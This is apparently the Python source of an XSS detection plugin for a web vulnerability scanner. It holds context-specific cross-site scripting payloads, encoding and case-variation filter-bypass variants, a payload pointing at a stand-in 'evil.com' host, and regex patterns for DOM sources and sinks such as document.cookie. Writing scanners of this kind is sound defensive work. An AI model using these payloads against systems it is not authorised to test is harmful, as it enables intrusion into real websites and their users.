"""
Cross-Site Scripting (XSS) Detection Plugin.
Detects reflected XSS, DOM-based hints, and context-aware payload variations.
"""

import re
import html
from typing import List, Optional, Dict, Any, Tuple
from urllib.parse import quote, unquote

from .base import ActivePlugin, PluginContext, PluginResult, PluginCategory
from mwavs.core.engine import HTTPEngine
from mwavs.core.request_wrapper import RequestWrapper, HTTPMethod, RequestBuilder
from mwavs.core.response_wrapper import ResponseWrapper
from mwavs.core.utils import Finding, PayloadEncoder, RandomUtils
from mwavs.core.exceptions import RequestException


class XSSPlugin(ActivePlugin):
    """
    Cross-Site Scripting (XSS) detection plugin.
    
    Features:
    - Reflected XSS detection with context analysis
    - DOM-based XSS hints
    - Context-aware payload variations
    - Evidence extraction via reflection tracing
    - Multiple encoding bypass attempts
    """
    
    name = "xss"
    description = "Cross-Site Scripting (XSS) detection module"
    category = PluginCategory.XSS
    author = "Security Team"
    version = "1.0.0"
    default_severity = "high"
    
    cvss_score = 6.1
    cwe_id = "CWE-79"
    references = [
        "https://owasp.org/www-community/attacks/xss/",
        "https://cwe.mitre.org/data/definitions/79.html",
        "https://portswigger.net/web-security/cross-site-scripting",
    ]
    
    # Context-specific payloads
    CONTEXT_PAYLOADS = {
        'html_body': [
            '<script>alert("{marker}")</script>',
            '<img src=x onerror=alert("{marker}")>',
            '<svg onload=alert("{marker}")>',
            '<body onload=alert("{marker}")>',
            '<iframe src="javascript:alert(\'{marker}\')">',
            '<details open ontoggle=alert("{marker}")>',
            '<marquee onstart=alert("{marker}")>',
        ],
        'html_attribute': [
            '" onmouseover="alert(\'{marker}\')" x="',
            "' onmouseover='alert(\"{marker}\")' x='",
            '" onfocus="alert(\'{marker}\')" autofocus="',
            "' onfocus='alert(\"{marker}\")' autofocus='",
            '" onclick="alert(\'{marker}\')" x="',
            '"><script>alert("{marker}")</script><x y="',
        ],
        'javascript': [
            "';alert('{marker}');//",
            '";alert("{marker}");//',
            "</script><script>alert('{marker}')</script>",
            "'-alert('{marker}')-'",
            '"-alert("{marker}")-"',
            "\\';alert('{marker}');//",
        ],
        'url_context': [
            "javascript:alert('{marker}')",
            "data:text/html,<script>alert('{marker}')</script>",
            "//evil.com/{marker}",
        ],
        'css_context': [
            "expression(alert('{marker}'))",
            "url('javascript:alert(\"{marker}\")')",
        ],
    }
    
    # DOM sink patterns for DOM XSS hints
    DOM_SINKS = [
        r'document\.write\s*\(',
        r'document\.writeln\s*\(',
        r'\.innerHTML\s*=',
        r'\.outerHTML\s*=',
        r'\.insertAdjacentHTML\s*\(',
        r'eval\s*\(',
        r'setTimeout\s*\(["\']',
        r'setInterval\s*\(["\']',
        r'new\s+Function\s*\(',
        r'location\s*=',
        r'location\.href\s*=',
        r'location\.replace\s*\(',
        r'location\.assign\s*\(',
        r'\.src\s*=',
        r'jQuery\s*\(\s*["\']<',
        r'\$\s*\(\s*["\']<',
    ]
    
    # DOM source patterns
    DOM_SOURCES = [
        r'location\.hash',
        r'location\.search',
        r'location\.href',
        r'document\.URL',
        r'document\.documentURI',
        r'document\.referrer',
        r'window\.name',
        r'document\.cookie',
        r'localStorage\.',
        r'sessionStorage\.',
    ]
    
    def __init__(self, config=None):
        super().__init__(config)
        self._reflected_markers: Dict[str, str] = {}
    
    def run(
        self,
        engine: HTTPEngine,
        target: str,
        context: PluginContext
    ) -> PluginResult:
        """Execute XSS scanning."""
        result = self.create_result()
        
        try:
            # First, check for DOM XSS patterns in baseline
            if context.baseline_response:
                dom_findings = self._check_dom_xss_patterns(
                    target, context.baseline_response
                )
                for finding in dom_findings:
                    result.add_finding(finding)
            
            # Get injection points
            injection_points = self.get_injection_points(target, context)
            
            for param_name, param_value, location in injection_points:
                if self.should_stop():
                    result.aborted = True
                    result.abort_reason = "Stop requested"
                    break
                
                self.logger.debug(f"Testing parameter: {param_name} ({location})")
                
                findings = self._test_xss_parameter(
                    engine, target, param_name, param_value,
                    location, context
                )
                
                for finding in findings:
                    result.add_finding(finding)
                    result.requests_made += 1
        
        except Exception as e:
            result.add_error(f"XSS scan error: {str(e)}")
            self.logger.error(f"Error during XSS scan: {e}", exc_info=True)
        
        return self.postprocess(result)
    
    def test_parameter(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext
    ) -> List[Finding]:
        """Test a parameter for XSS (called by parent class)."""
        return self._test_xss_parameter(
            engine, target, param_name, param_value, location, context
        )
    
    def _test_xss_parameter(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        param_value: str,
        location: str,
        context: PluginContext
    ) -> List[Finding]:
        """Test a specific parameter for XSS vulnerabilities."""
        findings = []
        
        # Generate unique marker for this test
        marker = f"XSS{RandomUtils.hex_string(8)}"
        
        # Step 1: Probe with marker to check reflection
        probe_response = self._send_probe(
            engine, target, param_name, marker, location, context
        )
        
        if not probe_response:
            return findings
        
        # Check if marker is reflected
        reflections = probe_response.find_reflection(marker)
        
        if not reflections:
            return findings
        
        self.logger.debug(
            f"Found {len(reflections)} reflections for {param_name}"
        )
        
        # Step 2: Analyze reflection contexts and test context-specific payloads
        for reflection in reflections:
            reflection_context = reflection['context']
            
            # Get payloads for this context
            payloads = self._get_context_payloads(reflection_context, marker)
            
            for payload_template in payloads:
                if self.should_stop():
                    break
                
                payload = payload_template.format(marker=marker)
                
                # Test with different encodings
                for encoding_name, encoded_payload in self._get_encoded_payloads(payload):
                    finding = self._test_payload(
                        engine, target, param_name, encoded_payload,
                        location, context, marker, reflection_context
                    )
                    
                    if finding:
                        findings.append(finding)
                        
                        # If we found XSS, we can stop testing this parameter
                        if self.config.plugins.stop_on_first_finding:
                            return findings
                        break
        
        return findings
    
    def _send_probe(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        probe_value: str,
        location: str,
        context: PluginContext
    ) -> Optional[ResponseWrapper]:
        """Send initial probe to check for reflection."""
        try:
            if location == 'url':
                params = dict(context.parameters)
                params[param_name] = probe_value
                
                request = (
                    RequestBuilder(target)
                    .params(params)
                    .headers(context.headers)
                    .cookies(context.cookies)
                    .build()
                )
            elif location == 'body':
                body_params = dict(context.body_params)
                body_params[param_name] = probe_value
                
                request = (
                    RequestBuilder(target)
                    .post()
                    .data(body_params)
                    .headers(context.headers)
                    .cookies(context.cookies)
                    .build()
                )
            else:
                # Header injection
                headers = dict(context.headers)
                headers[param_name] = probe_value
                
                request = (
                    RequestBuilder(target)
                    .headers(headers)
                    .cookies(context.cookies)
                    .build()
                )
            
            return engine.request(request)
        
        except RequestException as e:
            self.logger.debug(f"Probe request failed: {e}")
            return None
    
    def _test_payload(
        self,
        engine: HTTPEngine,
        target: str,
        param_name: str,
        payload: str,
        location: str,
        context: PluginContext,
        marker: str,
        reflection_context: str
    ) -> Optional[Finding]:
        """Test a specific XSS payload."""
        try:
            if location == 'url':
                params = dict(context.parameters)
                params[param_name] = payload
                
                request = (
                    RequestBuilder(target)
                    .params(params)
                    .headers(context.headers)
                    .cookies(context.cookies)
                    .tag(f"xss:{param_name}")
                    .build()
                )
            elif location == 'body':
                body_params = dict(context.body_params)
                body_params[param_name] = payload
                
                request = (
                    RequestBuilder(target)
                    .post()
                    .data(body_params)
                    .headers(context.headers)
                    .cookies(context.cookies)
                    .tag(f"xss:{param_name}")
                    .build()
                )
            else:
                headers = dict(context.headers)
                headers[param_name] = payload
                
                request = (
                    RequestBuilder(target)
                    .headers(headers)
                    .cookies(context.cookies)
                    .tag(f"xss:{param_name}")
                    .build()
                )
            
            response = engine.request(request)
            
            # Check if payload is reflected unencoded (XSS confirmation)
            if self._is_xss_confirmed(response, payload, marker):
                # Extract evidence
                evidence = self._extract_evidence(response, payload)
                
                # Determine confidence based on reflection context
                confidence = self._calculate_confidence(
                    payload, reflection_context, response
                )
                
                return self.create_finding(
                    vulnerability_type="Reflected XSS",
                    url=target,
                    severity="high" if confidence >= 90 else "medium",
                    confidence=confidence,
                    parameter=param_name,
                                        payload=payload,
                    evidence=evidence,
                    description=(
                        f"Reflected Cross-Site Scripting vulnerability detected in "
                        f"parameter '{param_name}'. The payload was reflected in "
                        f"a {reflection_context} context without proper sanitization."
                    ),
                    remediation=(
                        "Implement proper output encoding based on the context "
                        "(HTML entity encoding, JavaScript encoding, URL encoding, etc.). "
                        "Use Content Security Policy (CSP) headers as an additional "
                        "defense layer. Consider using auto-escaping template engines."
                    ),
                    request_data=request.to_dict(),
                    response_data={
                        'status_code': response.status_code,
                        'content_length': response.content_length,
                        'reflection_context': reflection_context,
                    }
                )
        
        except RequestException as e:
            self.logger.debug(f"Payload test failed: {e}")
        
        return None
    
    def _is_xss_confirmed(
        self,
        response: ResponseWrapper,
        payload: str,
        marker: str
    ) -> bool:
        """
        Confirm if XSS is actually exploitable.
        Checks for unencoded reflection of dangerous characters.
        """
        body = response.text
        
        # Check if the marker appears with script/event handler context
        dangerous_patterns = [
            f'<script>alert("{marker}")</script>',
            f"<script>alert('{marker}')</script>",
            f'onerror=alert("{marker}")',
            f"onerror=alert('{marker}')",
            f'onload=alert("{marker}")',
            f"onload=alert('{marker}')",
            f'onmouseover=alert("{marker}")',
            f"onmouseover=alert('{marker}')",
            f'onclick=alert("{marker}")',
            f"onclick=alert('{marker}')",
            f'onfocus=alert("{marker}")',
            f"onfocus=alert('{marker}')",
        ]
        
        for pattern in dangerous_patterns:
            if pattern.lower() in body.lower():
                return True
        
        # Check for SVG-based XSS
        if f'<svg' in body.lower() and f'onload=' in body.lower() and marker in body:
            return True
        
        # Check for IMG-based XSS
        if f'<img' in body.lower() and f'onerror=' in body.lower() and marker in body:
            return True
        
        # Check if dangerous characters are unencoded
        # This indicates potential XSS even if exact payload doesn't match
        if marker in body:
            # Find the context around the marker
            idx = body.find(marker)
            context_start = max(0, idx - 100)
            context_end = min(len(body), idx + len(marker) + 100)
            context = body[context_start:context_end]
            
            # Check for unencoded angle brackets near marker
            if '<' in payload and '<' in context:
                # Verify it's not HTML encoded
                if '&lt;' not in context.replace('<', ''):
                    return True
            
            # Check for unencoded quotes in attribute context
            if ('"' in payload or "'" in payload) and marker in context:
                if '&quot;' not in context and '&#' not in context:
                    # Check if we broke out of attribute
                    if re.search(r'=["\'][^"\']*' + re.escape(marker), context):
                        return True
        
        return False
    
    def _extract_evidence(
        self,
        response: ResponseWrapper,
        payload: str
    ) -> str:
        """Extract evidence snippet from response."""
        body = response.text
        
        # Find payload in response
        payload_lower = payload.lower()
        body_lower = body.lower()
        
        idx = body_lower.find(payload_lower[:30])  # First 30 chars
        if idx == -1:
            # Try to find parts of payload
            for part in payload.split():
                if part in body:
                    idx = body.find(part)
                    break
        
        if idx == -1:
            return "Payload reflected but exact location not determined"
        
        # Extract context
        start = max(0, idx - 100)
        end = min(len(body), idx + len(payload) + 100)
        evidence = body[start:end]
        
        # Clean up for display
        evidence = re.sub(r'\s+', ' ', evidence)
        
        if start > 0:
            evidence = "..." + evidence
        if end < len(body):
            evidence = evidence + "..."
        
        return evidence
    
    def _calculate_confidence(
        self,
        payload: str,
        reflection_context: str,
        response: ResponseWrapper
    ) -> float:
        """Calculate confidence score for finding."""
        confidence = 70.0
        
        # Higher confidence for certain contexts
        context_scores = {
            'html_body': 90.0,
            'html_attribute': 85.0,
            'javascript': 95.0,
            'url_context': 80.0,
            'css_context': 75.0,
        }
        
        base_confidence = context_scores.get(reflection_context, 70.0)
        
        # Check Content-Type
        content_type = response.content_type or ''
        if 'text/html' in content_type:
            base_confidence += 5
        
        # Check for CSP header (reduces exploitability)
        if response.has_header('Content-Security-Policy'):
            csp = response.get_header('Content-Security-Policy')
            if 'script-src' in csp and "'unsafe-inline'" not in csp:
                base_confidence -= 20
        
        # Check for X-XSS-Protection
        xss_protection = response.get_header('X-XSS-Protection')
        if xss_protection and xss_protection.startswith('1'):
            base_confidence -= 10
        
        return min(100.0, max(0.0, base_confidence))
    
    def _get_context_payloads(
        self,
        context: str,
        marker: str
    ) -> List[str]:
        """Get payloads appropriate for the reflection context."""
        payloads = self.CONTEXT_PAYLOADS.get(context, [])
        
        # If unknown context, try all payloads
        if not payloads:
            payloads = []
            for ctx_payloads in self.CONTEXT_PAYLOADS.values():
                payloads.extend(ctx_payloads[:2])  # First 2 from each context
        
        return payloads
    
    def _get_encoded_payloads(
        self,
        payload: str
    ) -> List[Tuple[str, str]]:
        """Get different encoded versions of payload."""
        encodings = [
            ('none', payload),
            ('url', PayloadEncoder.url_encode(payload)),
            ('double_url', PayloadEncoder.double_url_encode(payload)),
            ('html', PayloadEncoder.html_encode(payload)),
            ('unicode', payload.replace('<', '\\u003c').replace('>', '\\u003e')),
        ]
        
        # Add case variations for filter bypass
        case_varied = ''
        for i, c in enumerate(payload):
            if c.isalpha():
                case_varied += c.upper() if i % 2 == 0 else c.lower()
            else:
                case_varied += c
        encodings.append(('case_varied', case_varied))
        
        return encodings
    
    def _check_dom_xss_patterns(
        self,
        target: str,
        response: ResponseWrapper
    ) -> List[Finding]:
        """Check for DOM-based XSS patterns."""
        findings = []
        
        # Extract JavaScript from response
        scripts = response.extract_scripts()
        full_script_content = '\n'.join(scripts)
        
        if not full_script_content:
            return findings
        
        # Check for dangerous sink patterns
        sink_matches = []
        for sink_pattern in self.DOM_SINKS:
            matches = re.findall(sink_pattern, full_script_content, re.IGNORECASE)
            if matches:
                sink_matches.extend(matches)
        
        # Check for source patterns
        source_matches = []
        for source_pattern in self.DOM_SOURCES:
            matches = re.findall(source_pattern, full_script_content, re.IGNORECASE)
            if matches:
                source_matches.extend(matches)
        
        # If both sources and sinks are present, flag as potential DOM XSS
        if sink_matches and source_matches:
            # Try to find direct source->sink flows
            for source in source_matches:
                for sink in sink_matches:
                    # Look for patterns where source is used with sink
                    flow_patterns = [
                        rf'{re.escape(sink)}.*{re.escape(source)}',
                        rf'{re.escape(source)}.*{re.escape(sink)}',
                    ]
                    
                    for pattern in flow_patterns:
                        if re.search(pattern, full_script_content, re.DOTALL):
                            evidence = self._extract_dom_evidence(
                                full_script_content, source, sink
                            )
                            
                            finding = self.create_finding(
                                vulnerability_type="DOM-based XSS (Potential)",
                                url=target,
                                severity="medium",
                                confidence=60.0,
                                evidence=evidence,
                                description=(
                                    f"Potential DOM-based XSS detected. User-controllable "
                                    f"source '{source}' may flow to dangerous sink '{sink}'. "
                                    f"Manual verification required."
                                ),
                                remediation=(
                                    "Avoid using dangerous sinks like innerHTML, eval, "
                                    "document.write. Use safe alternatives like textContent, "
                                    "createElement. Sanitize all user input before use in DOM."
                                ),
                            )
                            findings.append(finding)
                            break
        
        return findings
    
    def _extract_dom_evidence(
        self,
        script_content: str,
        source: str,
        sink: str
    ) -> str:
        """Extract evidence for DOM XSS finding."""
        lines = script_content.split('\n')
        relevant_lines = []
        
        for i, line in enumerate(lines):
            if source in line or sink in line:
                # Include context
                start = max(0, i - 2)
                end = min(len(lines), i + 3)
                for j in range(start, end):
                    if lines[j].strip() and lines[j] not in relevant_lines:
                        relevant_lines.append(lines[j])
        
        return '\n'.join(relevant_lines[:10])  # Limit to 10 lines
    
    def get_payloads(self) -> List[str]:
        """Get XSS payloads from file or defaults."""
        try:
            payloads = self.payload_manager.load('xss')
            if payloads:
                return payloads
        except Exception:
            pass
        
        # Default payloads if file not found
        return [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<body onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
        ]